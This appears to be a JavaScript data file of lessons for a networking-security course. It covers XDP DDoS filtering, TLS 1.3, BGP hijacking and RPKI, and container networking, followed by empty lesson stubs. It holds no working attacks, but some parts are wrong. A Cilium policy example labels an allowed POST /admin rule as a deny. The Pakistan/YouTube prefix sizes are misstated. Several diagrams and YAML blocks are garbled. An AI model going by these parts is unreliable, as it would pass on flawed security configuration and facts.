<li><strong>XDP programs</strong> run at the NIC driver level</li>
<li>Each packet is checked against eBPF maps containing attack signatures</li>
<li>Bad packets are dropped with XDP_DROP — never enter the kernel</li>
<li>Good packets pass through to the application</li>
<li>Attack patterns are updated in real-time (no restart needed)</li>
</ol>

<p><strong>Real incident — 800 Gbps attack:</strong></p>
<ul>
<li>Attack: UDP flood from ~300,000 source IPs</li>
<li>XDP program checked each packet against a Bloom filter in eBPF map</li>
<li>Dropped 99.7% of attack traffic at line speed</li>
<li>Server CPU stayed under 10%</li>
<li>Legitimate users noticed nothing</li>
</ul>

<p><strong>Why eBPF was the right tool:</strong></p>
<ul>
<li><strong>Speed</strong> — XDP processes before kernel allocates memory for the packet</li>
<li><strong>Flexibility</strong> — update attack rules without restarting anything</li>
<li><strong>Safety</strong> — verifier ensures eBPF programs can't crash the kernel</li>
<li><strong>Programmable</strong> — can match complex patterns (not just IP/port)</li>
</ul>

<p><strong>Their tool: xdpcap</strong></p>
<ul>
<li>Like tcpdump but for XDP</li>
<li>Captures packets that XDP programs are dropping</li>
<li>Useful for debugging: "why is this packet being dropped?"</li>
</ul>

<p><strong>Scale:</strong></p>
<ul>
<li>Cloudflare runs eBPF on every server in 300+ data centers</li>
<li>Each server can drop 10M+ packets/second with XDP</li>
<li>Combined capacity: can absorb multi-Tbps attacks</li>
</ul>

{questions}
<ol>
<li>Why is XDP faster than iptables for dropping packets?</li>
<li>What is the role of the eBPF verifier? Why is it critical for security?</li>
<li>A company uses 5000 iptables rules for firewall. How would migrating to eBPF improve performance?</li>
</ol>`
      }
    ]
  },

  306: {
    titleEn: "TLS 1.3 — Modern Encryption",
    pages: [
      {
        titleEn: "TLS 1.2 vs 1.3 — What Changed",
        contentEn: `<p><strong>TLS 1.3 (RFC 8446, 2018) removed everything that was broken or slow in TLS 1.2.</strong></p>

<p><strong>Removed from TLS 1.3:</strong></p>
<ul>
<li>RSA key exchange (no forward secrecy)</li>
<li>CBC mode ciphers (BEAST, Lucky13 attacks)</li>
<li>RC4, DES, 3DES (weak ciphers)</li>
<li>SHA-1 (broken hash)</li>
<li>Compression (CRIME attack)</li>
<li>Renegotiation (complexity, attack surface)</li>
<li>Custom DHE groups (weak parameters possible)</li>
<li>Static RSA/DH (no forward secrecy)</li>
<li>ChangeCipherSpec message (unnecessary)</li>
</ul>

<p><strong>TLS 1.2 had ~37 cipher suites. TLS 1.3 has only 5:</strong></p>

<table>
<thead><tr><th>Cipher Suite</th><th>Encryption</th><th>Hash</th></tr></thead>
<tbody>
<tr><td>TLS_AES_256_GCM_SHA384</td><td>AES-256-GCM</td><td>SHA-384</td></tr>
<tr><td>TLS_AES_128_GCM_SHA256</td><td>AES-128-GCM</td><td>SHA-256</td></tr>
<tr><td>TLS_CHACHA20_POLY1305_SHA256</td><td>ChaCha20-Poly1305</td><td>SHA-256</td></tr>
<tr><td>TLS_AES_128_CCM_SHA256</td><td>AES-128-CCM</td><td>SHA-256</td></tr>
<tr><td>TLS_AES_128_CCM_8_SHA256</td><td>AES-128-CCM-8</td><td>SHA-256</td></tr>
</tbody></table>

<p><strong>Key differences:</strong></p>
<ul>
<li>All TLS 1.3 ciphers use <strong>AEAD</strong> (Authenticated Encryption with Associated Data)</li>
<li>Key exchange is ALWAYS Diffie-Hellman (ECDHE or DHE) — RSA key exchange removed</li>
<li>This means <strong>forward secrecy is mandatory</strong> — not optional like in TLS 1.2</li>
<li>Fewer choices = fewer configuration mistakes = more secure by default</li>
</ul>

<p><strong>Why removing RSA key exchange matters:</strong></p>
<ul>
<li>TLS 1.2 with RSA: server's private key decrypts ALL past sessions</li>
<li>Steal the key → decrypt years of recorded traffic</li>
<li>TLS 1.3 with ECDHE: each session has unique keys</li>
<li>Steal the key → can't decrypt past sessions (forward secrecy)</li>
</ul>`
      },
      {
        titleEn: "1-RTT Handshake — How It Works",
        contentEn: `<p><strong>TLS 1.3 combines the TLS and key exchange into a single round trip.</strong></p>

<p><strong>TLS 1.2 Handshake (2-RTT):</strong></p>
<pre><code>Client                              Server
<table>
<thead><tr><th>--- ClientHello -------------------></th><th>RTT 1</th></tr></thead>
<tbody>
<tr><td>--- Key Exchange + Finished -------></td><td>RTT 2</td></tr>
<tr><td><-- Finished -----------------------</td></tr>
<tr><td>--- Application Data -------------></td><td>RTT 3 (first data!)</td></tr>
</tbody></table>
</code></pre>

<p><strong>TLS 1.3 Handshake (1-RTT):</strong></p>
<pre><code>Client                              Server
<table>
<thead><tr><th>--- ClientHello ------------------></th></tr></thead>
<tbody>
<tr><td>+ supported_versions (1.3)</td><td>RTT 1</td></tr>
<tr><td><-- ServerHello -------------------</td></tr>
<tr><td>+ key_share (ECDHE public key)</td></tr>
<tr><td>+ {Certificate}</td></tr>
<tr><td>+ {CertificateVerify}</td></tr>
<tr><td>+ {Finished}</td></tr>
<tr><td>--- {Finished} -------------------></td></tr>
<tr><td>--- Application Data ------------></td><td>RTT 1 (first data!)</td></tr>
</tbody></table>
</code></pre>
<p>{} = encrypted</p>

<p><strong>Why it's faster:</strong></p>
<ul>
<li>Client sends its ECDHE key share in the FIRST message (guesses the curve)</li>
<li>Server responds with everything at once: its key, certificate, and finished</li>
<li>Both sides can compute the shared secret after 1 round trip</li>
<li>Application data can flow immediately after</li>
</ul>

<p><strong>ECDHE (Elliptic Curve Diffie-Hellman Ephemeral):</strong></p>
<ul>
<li>Client generates random private key → computes public key on the curve</li>
<li>Server generates random private key → computes public key on the curve</li>
<li>Both compute the same shared secret (math magic of elliptic curves)</li>
<li><strong>Ephemeral</strong> = new keys every session → forward secrecy</li>
<li>Common curves: X25519 (fast, safe), P-256 (widely supported)</li>
</ul>`
      },
      {
        titleEn: "Forward Secrecy and 0-RTT Resumption",
        contentEn: `<p><strong>Forward secrecy means: compromise today doesn't reveal yesterday.</strong></p>

<p><strong>How forward secrecy works in TLS 1.3:</strong></p>
<pre><code>Session 1: Client key = random_A, Server key = random_B → shared secret_1
<p>Session 2: Client key = random_C, Server key = random_D → shared secret_2</p>
<p>Session 3: Client key = random_E, Server key = random_F → shared secret_3</p>

<p>Each session uses NEW random keys.</p>
<p>Crack session 2? You only get session 2's data.</p>
<p>Sessions 1 and 3 are safe.</p>
</code></pre>

<p><strong>0-RTT Resumption (PSK):</strong></p>
<ul>
<li>After a successful TLS 1.3 handshake, server sends a <strong>session ticket</strong></li>
<li>Next connection: client sends the ticket + application data in the FIRST packet</li>
<li>Server decrypts and responds immediately — <strong>zero round trips</strong> of latency</li>
</ul>

<pre><code>Client                              Server
<table>
<thead><tr><th>--- ClientHello ------------------></th></tr></thead>
<tbody>
<tr><td>+ early_data (0-RTT)</td><td>0 RTT — data sent immediately!</td></tr>
<tr><td><-- ServerHello + Finished --------</td></tr>
<tr><td>--- Finished ---------------------></td></tr>
</tbody></table>
</code></pre>

<p><strong>The 0-RTT security tradeoff:</strong></p>
<ul>
<li>0-RTT data is <strong>replayable</strong> — an attacker can capture and resend it</li>
<li>Safe for: GET requests (reading data)</li>
<li>Dangerous for: POST requests (creating orders, transferring money)</li>
<li>Servers must implement <strong>anti-replay</strong> mechanisms</li>
<li>Many servers disable 0-RTT for non-idempotent requests</li>
</ul>

<p><strong>Practical impact:</strong></p>
<ul>
<li>TLS 1.2 → 1.3: saves ~100ms on first connection (one less RTT)</li>
<li>0-RTT resumption: saves ~200ms on repeat connections</li>
<li>On mobile networks (150ms RTT): this is very noticeable</li>
</ul>`
      },
      {
        titleEn: "Practice — TLS 1.3 Deep Dive",
        contentEn: `{questions}

<p><strong>Concept check:</strong></p>

<ol>
<li>TLS 1.2 allowed RSA key exchange. TLS 1.3 removed it. Explain why in terms of forward secrecy.</li>
</ol>

<ol>
<li>TLS 1.3 has only 5 cipher suites, while TLS 1.2 had ~37. Why is fewer actually more secure?</li>
</ol>

<ol>
<li>Draw the TLS 1.3 1-RTT handshake from memory. Mark which messages are encrypted.</li>
</ol>

<ol>
<li>A banking website enables 0-RTT resumption for all requests. What is the security risk? What kind of requests should NOT use 0-RTT?</li>
</ol>

<ol>
<li>Explain ECDHE in simple terms: why does "ephemeral" matter?</li>
</ol>

{simulation}

<p><strong>Scenario:</strong> You are a security engineer. Your company's web server supports both TLS 1.2 and TLS 1.3. The CEO asks: "Why should we disable TLS 1.2? Everything works fine."</p>

<p>Write a brief explanation covering:</p>
<ul>
<li>What attacks are possible with TLS 1.2 that are impossible with TLS 1.3?</li>
<li>What is the performance benefit?</li>
<li>What might break if you disable TLS 1.2? (think about old clients)</li>
<li>What is your recommendation?</li>
</ul>

{thinkOutside}

<p>An attacker records all encrypted TLS 1.3 traffic between a user and a bank for 5 years. Then they steal the server's private RSA key. Can they decrypt the recorded traffic? Why or why not? What if it was TLS 1.2 with RSA key exchange?</p>`
      }
    ]
  },

  307: {
    titleEn: "Anycast, BGP Hijacking, and RPKI",
    pages: [
      {
        titleEn: "Anycast Routing via BGP",
        contentEn: `<p><strong>Anycast = one IP address, many servers around the world. BGP picks the closest one.</strong></p>

<p><strong>How it works:</strong></p>
<pre><code>Cloudflare DNS: 1.1.1.1

<p>Server in London announces via BGP: "I have route to 1.1.1.1"</p>
<p>Server in Tokyo announces via BGP: "I have route to 1.1.1.1"</p>
<p>Server in New York announces via BGP: "I have route to 1.1.1.1"</p>

<p>User in Paris → BGP picks shortest AS path → routes to London</p>
<p>User in Seoul → BGP picks shortest AS path → routes to Tokyo</p>
</code></pre>

<p><strong>Why anycast works:</strong></p>
<ul>
<li>BGP naturally routes to the "closest" announcement (shortest AS path)</li>
<li>No special protocol needed — just announce the same prefix from multiple locations</li>
<li>Users are automatically sent to the nearest server</li>
</ul>

<p><strong>Use cases:</strong></p>
<ul>
<li><strong>DNS</strong> — all root servers use anycast (13 addresses, 1000+ actual servers)</li>
<li><strong>CDN</strong> — Cloudflare, AWS CloudFront, Google serve content via anycast</li>
<li><strong>DDoS protection</strong> — attack traffic is spread across all locations</li>
</ul>

<p><strong>Anycast + DDoS:</strong></p>
<pre><code>Without anycast:           With anycast:
<p>All attack traffic →       Attack traffic spread →</p>
<p>[Single server] 💀         [London] 15% of attack</p>
<p>[Tokyo] 10% of attack</p>
<p>[NYC] 20% of attack</p>
<p>[São Paulo] 15% of attack</p>
<p>... each location handles a small portion</p>
</code></pre>

<p><strong>Limitations:</strong></p>
<ul>
<li>Works great for UDP (DNS) — each packet is independent</li>
<li>TCP with anycast needs care — if BGP route changes mid-connection, packets go to a different server</li>
<li>Solutions: ECMP pinning, QUIC Connection ID, flow-aware load balancing</li>
</ul>`
      },
      {
        titleEn: "BGP Hijacking and RPKI Protection",
        contentEn: `<p><strong>BGP hijacking = announcing someone else's IP prefix as your own.</strong></p>

<p><strong>Types of BGP hijacking:</strong></p>

<table>
<thead><tr><th>Type</th><th>Method</th><th>Effect</th></tr></thead>
<tbody>
<tr><td><strong>Prefix hijack</strong></td><td>Announce exact same prefix</td><td>Traffic splits (some goes to attacker)</td></tr>
<tr><td><strong>Sub-prefix hijack</strong></td><td>Announce more specific prefix (/25 vs /24)</td><td>All traffic goes to attacker (longest match wins)</td></tr>
<tr><td><strong>AS path poisoning</strong></td><td>Fake shorter AS path</td><td>Traffic prefers attacker's "shorter" path</td></tr>
<tr><td><strong>Route leak</strong></td><td>Accidentally share internal routes externally</td><td>Traffic takes wrong path</td></tr>
</tbody></table>

<p><strong>What attackers can do with hijacked traffic:</strong></p>
<ul>
<li><strong>Black hole</strong> — drop all traffic (denial of service)</li>
<li><strong>Intercept</strong> — read traffic, then forward to real destination (man-in-the-middle)</li>
<li><strong>Impersonate</strong> — serve fake content (phishing, malware)</li>
</ul>

<p><strong>RPKI (Resource Public Key Infrastructure):</strong></p>

<pre><code>RPKI chain:
<p>IANA → RIR (ARIN/RIPE) → ISP → signs ROA</p>

<p>ROA (Route Origin Authorization):</p>
<p>"AS13335 is authorized to announce 1.1.1.0/24"</p>
<p>↓ signed by ARIN's certificate</p>

<p>Router with RPKI validation:</p>
<ul>
<li>Receives BGP announcement: "AS9999 has route to 1.1.1.0/24"</li>
<li>Checks RPKI: ROA says only AS13335 can announce this</li>
<li>Result: INVALID → route rejected</li>
</ul>
</code></pre>

<p><strong>RPKI validation states:</strong></p>
<ul>
<li><strong>Valid</strong> — ROA exists and matches (accept)</li>
<li><strong>Invalid</strong> — ROA exists but doesn't match (reject)</li>
<li><strong>Not Found</strong> — no ROA exists (accept, but less trusted)</li>
</ul>

<p><strong>Current adoption (2025):</strong></p>
<ul>
<li>~55% of routes have ROAs</li>
<li>~35% of networks perform RPKI validation</li>
<li>Growing fast — major incidents push adoption</li>
</ul>`
      },
      {
        titleEn: "Historical BGP Incidents",
        contentEn: `<p><strong>Major BGP incidents that shaped internet routing security:</strong></p>

<table>
<thead><tr><th>Year</th><th>Incident</th><th>What Happened</th><th>Impact</th><th>Duration</th></tr></thead>
<tbody>
<tr><td><strong>2004</strong></td><td>TTNet (Turkey)</td><td>Announced 0.0.0.0/0 (default route) — "I'm the entire internet"</td><td>Internet disruption in parts of Europe</td><td>Hours</td></tr>
<tr><td><strong>2008</strong></td><td>Pakistan Telecom / YouTube</td><td>Announced YouTube's /25 to block it locally — leaked globally</td><td>YouTube down worldwide</td><td>~2 hours</td></tr>
<tr><td><strong>2010</strong></td><td>China Telecom</td><td>Announced ~37,000 prefixes belonging to others</td><td>15% of internet routed through China for 18 minutes</td><td>18 min</td></tr>
<tr><td><strong>2017</strong></td><td>Google (accidental)</td><td>Leaked Japanese network prefixes to global BGP</td><td>Major internet outage in Japan</td><td>1 hour</td></tr>
<tr><td><strong>2018</strong></td><td>eNet / Amazon DNS</td><td>Hijacked Route53 DNS IPs → redirected MyEtherWallet users</td><td>~$150K cryptocurrency stolen</td><td>2 hours</td></tr>
<tr><td><strong>2019</strong></td><td>China Telecom</td><td>Rerouted European mobile traffic through China</td><td>Potential interception of millions of users</td><td>2 hours</td></tr>
<tr><td><strong>2020</strong></td><td>Rostelecom (Russia)</td><td>Hijacked prefixes of Google, Amazon, Cloudflare, Akamai</td><td>Traffic rerouted through Russia</td><td>1 hour</td></tr>
<tr><td><strong>2022</strong></td><td>Russian ISPs</td><td>Multiple BGP hijacks during Ukraine conflict</td><td>Traffic interception attempts</td><td>Ongoing</td></tr>
<tr><td><strong>2024</strong></td><td>Orange Spain</td><td>Attacker gained RIPE account access, created bad ROAs</td><td>Major ISP routing disruption</td><td>Hours</td></tr>
</tbody></table>

<p><strong>Patterns in BGP incidents:</strong></p>
<ul>
<li>Most hijacks are <strong>accidental</strong> (configuration mistakes, route leaks)</li>
<li>Intentional hijacks are often by <strong>state actors</strong> or for <strong>financial gain</strong></li>
<li>Impact is always fast (minutes) because BGP propagates quickly</li>
<li>Recovery is slow (hours) because it requires manual intervention</li>
</ul>

<p><strong>Defenses today:</strong></p>
<ul>
<li><strong>RPKI/ROA</strong> — proves who owns a prefix</li>
<li><strong>BGP communities</strong> — signal "don't export" to prevent leaks</li>
<li><strong>ASPA (AS Provider Authorization)</strong> — new, proves AS relationships</li>
<li><strong>BGP Flowspec</strong> — distribute filtering rules via BGP</li>
<li><strong>Monitoring</strong> — RIPE RIS, BGPStream, Cloudflare Radar detect anomalies</li>
</ul>

{questions}
<ol>
<li>The 2008 Pakistan/YouTube incident used a sub-prefix hijack (/25 vs /24). Why does this always win in BGP routing?</li>
<li>The 2018 MyEtherWallet hijack combined BGP hijacking with DNS. Explain the attack chain.</li>
<li>If RPKI was fully deployed, which incidents in the table would it have prevented? Which would it NOT prevent?</li>
</ol>`
      }
    ]
  },

  308: {
    titleEn: "Container Networking",
    pages: [
      {
        titleEn: "Linux Network Namespaces",
        contentEn: `<p><strong>Containers use Linux namespaces for isolation. Network namespaces give each container its own network stack.</strong></p>

<p><strong>What a network namespace provides:</strong></p>
<ul>
<li>Own network interfaces (eth0, lo)</li>
<li>Own routing table</li>
<li>Own iptables/nftables rules</li>
<li>Own /proc/net</li>
<li>Completely separate from the host and other namespaces</li>
</ul>

<p><strong>Hands-on with network namespaces:</strong></p>
<pre><code>bash
<p># Create two namespaces</p>
<p>ip netns add red</p>
<p>ip netns add blue</p>

<p># Each has its own loopback (lo), nothing else</p>
<p>ip netns exec red ip link list   # only lo</p>

<p># Create a veth pair (virtual ethernet — like a cable)</p>
<p>ip link add veth-red type veth peer name veth-blue</p>

<p># Move each end to a namespace</p>
<p>ip link set veth-red netns red</p>
<p>ip link set veth-blue netns blue</p>

<p># Assign IPs</p>
<p>ip netns exec red ip addr add 10.0.0.1/24 dev veth-red</p>
<p>ip netns exec blue ip addr add 10.0.0.2/24 dev veth-blue</p>

<p># Bring interfaces up</p>
<p>ip netns exec red ip link set veth-red up</p>
<p>ip netns exec blue ip link set veth-blue up</p>

<p># Now they can communicate</p>
<p>ip netns exec red ping 10.0.0.2   # works!</p>
</code></pre>

<p><strong>veth pairs:</strong></p>
<ul>
<li>Virtual ethernet cable — two ends, connected together</li>
<li>Packets in one end come out the other</li>
<li>Like a network cable between two virtual machines</li>
<li>This is how containers connect to the host network</li>
</ul>

<p><strong>The 6 Linux namespaces used by containers:</strong></p>
<table>
<thead><tr><th>Namespace</th><th>Isolates</th></tr></thead>
<tbody>
<tr><td><strong>Network</strong></td><td>Network interfaces, routes, iptables</td></tr>
<tr><td><strong>PID</strong></td><td>Process IDs (container sees PID 1)</td></tr>
<tr><td><strong>Mount</strong></td><td>Filesystem mounts</td></tr>
<tr><td><strong>UTS</strong></td><td>Hostname</td></tr>
<tr><td><strong>IPC</strong></td><td>Shared memory, semaphores</td></tr>
<tr><td><strong>User</strong></td><td>User/group IDs</td></tr>
</tbody></table>`
      },
      {
        titleEn: "Docker Networking — Bridge, veth, NAT",
        contentEn: `<p><strong>Docker's default networking uses a Linux bridge + veth pairs + NAT.</strong></p>

<p><strong>Architecture diagram:</strong></p>
<pre><code>Host Machine
<p>┌─────────────────────────────────────────────────┐</p>
<p>│                                                 │</p>
<p>│  Container A          Container B               │</p>
<p>│  ┌──────────┐        ┌──────────┐              │</p>
<p>│  │ eth0     │        │ eth0     │              │</p>
<p>│  │ 172.17.  │        │ 172.17.  │              │</p>
<p>│  │ 0.2      │        │ 0.3      │              │</p>
<p>│  └────┬─────┘        └────┬─────┘              │</p>
<p>│       │ veth-A            │ veth-B              │</p>
<p>│       │                   │                     │</p>
<p>│  ┌────┴───────────────────┴─────┐              │</p>
<p>│  │        docker0 bridge         │              │</p>
<p>│  │        172.17.0.1             │              │</p>
<p>│  └──────────────┬───────────────┘              │</p>
<p>│                 │                               │</p>
<p>│            iptables NAT                         │</p>
<p>│          (MASQUERADE)                           │</p>
<p>│                 │                               │</p>
<p>│  ┌──────────────┴───────────────┐              │</p>
<p>│  │           eth0 (host)         │              │</p>
<p>│  │        192.168.1.100          │              │</p>
<p>│  └──────────────────────────────┘              │</p>
<p>└─────────────────────────────────────────────────┘</p>
</code></pre>

<p><strong>How it works step by step:</strong></p>
<ol>
<li>Docker creates the <strong>docker0</strong> bridge (like a virtual switch)</li>
<li>Each container gets a <strong>veth pair</strong> — one end in container (eth0), one end on bridge</li>
<li>Containers on the same bridge can talk to each other directly (Layer 2)</li>
<li>To reach the internet: <strong>iptables NAT</strong> translates container IP → host IP</li>
</ol>

<p><strong>Docker network types:</strong></p>
<table>
<thead><tr><th>Type</th><th>Use Case</th><th>Isolation</th></tr></thead>
<tbody>
<tr><td><strong>bridge</strong> (default)</td><td>Container ↔ container on same host</td><td>Good</td></tr>
<tr><td><strong>host</strong></td><td>Container uses host's network directly</td><td>None</td></tr>
<tr><td><strong>none</strong></td><td>No networking at all</td><td>Full</td></tr>
<tr><td><strong>overlay</strong></td><td>Container ↔ container across hosts (Swarm)</td><td>Good</td></tr>
<tr><td><strong>macvlan</strong></td><td>Container gets real MAC/IP on physical network</td><td>Good</td></tr>
</tbody></table>

<p><strong>Port mapping (bridge mode):</strong></p>
<pre><code>bash
<p>docker run -p 8080:80 nginx</p>
<p># iptables DNAT rule created:</p>
<p># Host:8080 → Container:80</p>
</code></pre>`
      },
      {
        titleEn: "Kubernetes Pod Networking",
        contentEn: `<p><strong>K8s networking rule: every Pod gets a real IP. Pods can reach any other Pod without NAT.</strong></p>

<p><strong>Same node — Pod to Pod:</strong></p>
<pre><code>Node 1 (10.0.1.0/24)
<p>┌─────────────────────────────────────┐</p>
<p>│  Pod A (10.0.1.2)    Pod B (10.0.1.3)│</p>
<p>│  ┌────────┐         ┌────────┐      │</p>
<p>│  │  eth0  │         │  eth0  │      │</p>
<p>│  └───┬────┘         └───┬────┘      │</p>
<p>│      │ veth              │ veth      │</p>
<p>│  ┌───┴──────────────────┴───┐       │</p>
<p>│  │       cbr0 bridge         │       │</p>
<p>│  └───────────────────────────┘       │</p>
<p>└─────────────────────────────────────┘</p>

<p>Pod A → bridge → Pod B (direct, Layer 2)</p>
</code></pre>

<p><strong>Cross node — Pod to Pod on different nodes:</strong></p>
<pre><code>Node 1 (10.0.1.0/24)              Node 2 (10.0.2.0/24)
<p>┌──────────────────┐              ┌──────────────────┐</p>
<p>│  Pod A (10.0.1.2)│              │  Pod C (10.0.2.5)│</p>
<p>│  ┌────────┐      │              │  ┌────────┐      │</p>
<p>│  │  eth0  │      │              │  │  eth0  │      │</p>
<p>│  └───┬────┘      │              │  └───┬────┘      │</p>
<p>│      │ veth      │              │      │ veth      │</p>
<p>│  ┌───┴────┐      │              │  ┌───┴────┐      │</p>
<p>│  │ bridge │      │              │  │ bridge │      │</p>
<p>│  └───┬────┘      │              │  └───┬────┘      │</p>
<p>│      │           │              │      │           │</p>
<p>│  [eth0/tunnel]   │              │  [eth0/tunnel]   │</p>
<p>└──────┬───────────┘              └──────┬───────────┘</p>
<p>│        Overlay / Routing        │</p>
<p>└────────────────────────────────┘</p>
</code></pre>

<p><strong>Cross-node solutions (CNI plugins):</strong></p>
<table>
<thead><tr><th>Plugin</th><th>Method</th><th>Speed</th></tr></thead>
<tbody>
<tr><td><strong>Flannel</strong></td><td>VXLAN overlay (encapsulation)</td><td>Good</td></tr>
<tr><td><strong>Calico</strong></td><td>BGP routing (no overlay)</td><td>Fast</td></tr>
<tr><td><strong>Cilium</strong></td><td>eBPF (replaces iptables + kube-proxy)</td><td>Fastest</td></tr>
<tr><td><strong>Weave</strong></td><td>Encrypted overlay</td><td>Good</td></tr>
</tbody></table>

<p><strong>K8s Service networking:</strong></p>
<ul>
<li><strong>ClusterIP</strong> — virtual IP, load balances to Pod IPs (kube-proxy / eBPF)</li>
<li><strong>NodePort</strong> — exposes on every node's IP:port (30000-32767)</li>
<li><strong>LoadBalancer</strong> — cloud provider provisions external LB</li>
<li><strong>Ingress</strong> — L7 routing (host/path rules → Services)</li>
</ul>`
      },
      {
        titleEn: "Cilium — eBPF Replaces iptables",
        contentEn: `<p><strong>Cilium uses eBPF to replace kube-proxy and iptables entirely.</strong></p>

<p><strong>The iptables problem in Kubernetes:</strong></p>
<pre><code>With kube-proxy + iptables:

<p>Each Service creates ~8 iptables rules</p>
<p>1000 Services = ~8000 rules</p>
<p>Each rule = linear scan (O(n))</p>

<p>Pod sends packet → iptables checks rule 1 → no match</p>
<p>→ checks rule 2 → no match</p>
<p>→ ...</p>
<p>→ checks rule 5847 → match! → forward</p>

<p>Time: O(n) per packet, n = number of rules</p>
<p>Update: full iptables rewrite on any Service change</p>
</code></pre>

<p><strong>Cilium's eBPF approach:</strong></p>
<pre><code>With Cilium:

<p>All Services stored in eBPF hash map</p>
<p>Lookup = O(1) regardless of number of Services</p>

<p>Pod sends packet → eBPF program → hash lookup → forward</p>

<p>Time: O(1) per packet</p>
<p>Update: single map entry update (no full rewrite)</p>
</code></pre>

<p><strong>Cilium features beyond basic networking:</strong></p>

<p><strong>L7 Network Policies:</strong></p>
<pre><code>yaml
<p># Traditional K8s NetworkPolicy: L3/L4 only</p>
<p># "Pod A can talk to Pod B on port 80"</p>

<p># Cilium CiliumNetworkPolicy: L7 aware</p>
<p>apiVersion: cilium.io/v2</p>
<p>kind: CiliumNetworkPolicy</p>
<p>spec:</p>
<p>endpointSelector:</p>
<p>matchLabels:</p>
<p>app: api-server</p>
<p>ingress:</p>
<ul>
<li>fromEndpoints:</li>
<li>matchLabels:</li>
</ul>
<p>app: frontend</p>
<p>toPorts:</p>
<ul>
<li>ports:</li>
<li>port: "80"</li>
</ul>
<p>rules:</p>
<p>http:</p>
<ul>
<li>method: "GET"    # Allow GET</li>
</ul>
<p>path: "/api/.*"</p>
<ul>
<li>method: "POST"   # Deny POST to /admin</li>
</ul>
<p>path: "/admin"</p>
<p># not listed = denied</p>
</code></pre>

<p><strong>Hubble — network observability:</strong></p>
<ul>
<li>Captures all network flows using eBPF</li>
<li>No sidecar proxy needed (unlike Istio/Envoy)</li>
<li>Shows: source pod → destination pod, protocol, verdict (allow/deny), latency</li>
<li>UI: real-time service dependency map</li>
</ul>

<p><strong>Performance comparison:</strong></p>

<table>
<thead><tr><th>Metric</th><th>kube-proxy + iptables</th><th>Cilium eBPF</th></tr></thead>
<tbody>
<tr><td>Service lookup</td><td>O(n)</td><td>O(1)</td></tr>
<tr><td>Rule update</td><td>Full rewrite</td><td>Single entry</td></tr>
<tr><td>Latency (1K services)</td><td>~1ms</td><td>~0.1ms</td></tr>
<tr><td>CPU at 10K services</td><td>High</td><td>Low</td></tr>
<tr><td>L7 policy</td><td>Not possible</td><td>Yes (HTTP, gRPC, Kafka)</td></tr>
<tr><td>Observability</td><td>External tools</td><td>Built-in (Hubble)</td></tr>
</tbody></table>

{thinkOutside}
<p>Your company runs 500 microservices in Kubernetes. Currently using Flannel (VXLAN overlay) + kube-proxy (iptables). Users report latency spikes during deployments. What would you recommend changing, and why?</p>`
      }
    ]
  },

  // ===== System & Linux (401-410) =====
  401: { titleEn: "Introduction to Linux", pages: [] },
  402: { titleEn: "Essential Commands", pages: [] },
  403: { titleEn: "Permissions & Users", pages: [] },
  404: { titleEn: "Networking Tools", pages: [] },
  405: { titleEn: "Bash Scripting", pages: [] },
  406: { titleEn: "Process Management", pages: [] },
  407: { titleEn: "Package Management", pages: [] },
  408: { titleEn: "Storage & File Systems", pages: [] },
  409: { titleEn: "Troubleshooting", pages: [] },
  410: { titleEn: "Linux Security Basics", pages: [] },

  // ===== Web & APIs (501-508) =====
  501: { titleEn: "How the Web Works", pages: [] },
  502: { titleEn: "HTTP in Depth", pages: [] },
  503: { titleEn: "REST APIs", pages: [] },
  504: { titleEn: "Authentication & Authorization", pages: [] },
  505: { titleEn: "Browser Internals", pages: [] },
  506: { titleEn: "API Security", pages: [] },
  507: { titleEn: "Tools — Postman, curl, DevTools", pages: [] },
  508: { titleEn: "Real-World Patterns", pages: [] },

  // ===== Red Team (601-608) =====
  601: { titleEn: "Introduction to Ethical Hacking", pages: [] },
  602: { titleEn: "Kali Linux Setup", pages: [] },
  603: { titleEn: "Reconnaissance", pages: [] },
  604: { titleEn: "Scanning & Enumeration", pages: [] },
  605: { titleEn: "Web Vulnerabilities", pages: [] },
  606: { titleEn: "Exploitation Basics", pages: [] },
  607: { titleEn: "Password Attacks", pages: [] },
  608: { titleEn: "Report Writing", pages: [] },

  // ===== Dark Web & Privacy (801-805) =====
  801: { titleEn: "Surface, Deep, and Dark Web", pages: [] },
  802: { titleEn: "How Tor Works", pages: [] },
  803: { titleEn: "Hidden Services (.onion)", pages: [] },
  804: { titleEn: "Privacy Tools", pages: [] },
  805: { titleEn: "Ethics & Law", pages: [] },

  // ===== Secure Development (701-708) =====
  701: { titleEn: "OWASP Top 10", pages: [] },
  702: { titleEn: "Injection Attacks", pages: [] },
  703: { titleEn: "Authentication Security", pages: [] },
  704: { titleEn: "XSS Prevention", pages: [] },
  705: { titleEn: "API Security", pages: [] },
  706: { titleEn: "Secure Coding Practices", pages: [] },
  707: { titleEn: "AI Security & Prompt Injection", pages: [] },
  708: { titleEn: "Security in CI/CD", pages: [] },
}
